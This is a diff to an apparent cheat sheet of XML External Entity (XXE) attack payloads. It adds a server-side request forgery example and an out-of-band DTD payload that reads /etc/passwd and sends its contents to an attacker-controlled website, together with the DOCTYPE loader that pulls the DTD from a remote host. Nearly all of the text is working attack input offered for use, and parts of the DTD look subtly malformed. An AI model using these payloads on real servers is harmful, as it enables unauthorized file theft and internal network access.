@@ -2,8 +2,8 @@ XXE: Basic XML Example
 
 <!--?xml version="1.0" ?-->
 <userInfo>
- <firstName>Rahul</firstName>
- <lastName>Jain</lastName>
+  <firstName>Rahul</firstName>
+  <lastName>Jain</lastName>
 </userInfo>
 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -39,6 +39,8 @@ XXE: Local File Inclusion Example
 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------
 
+XXE: Server Side Request Forgery Example
+
 <?xml version="1.0" encoding="utf-8"?>
 	<!DOCTYPE reset [
 	<!ENTITY % remote SYSTEM 'http://IP/file_name'>
@@ -48,10 +50,20 @@ XXE: Local File Inclusion Example
 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------
 
+XXE: Payload Using DTD File
+
+<!ENTITY % a SYSTEM 'file:///etc/passwd'>
+<!ENTITY % b "<!ENTITY &#x25; c SYSTEM 'your website/cookie=?%a;'> " > 
+%b;
+%c;
+
+(&#x25),(&#37) Are the  Hex and decimal value of (%)
+
+To Call This File   
+
 <?xml version="1.0" encoding="utf-8"?>
-	<!DOCTYPE xxe [
-	<!ENTITY % remote SYSTEM 'http://IP/file_name'>
-	%remote;
-	%intern;
-	%xxe; 
-	]>
+<!DOCTYPE xxe [
+<!ENTITY % remote SYSTEM 'http://IP/file_name'>
+%remote;
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
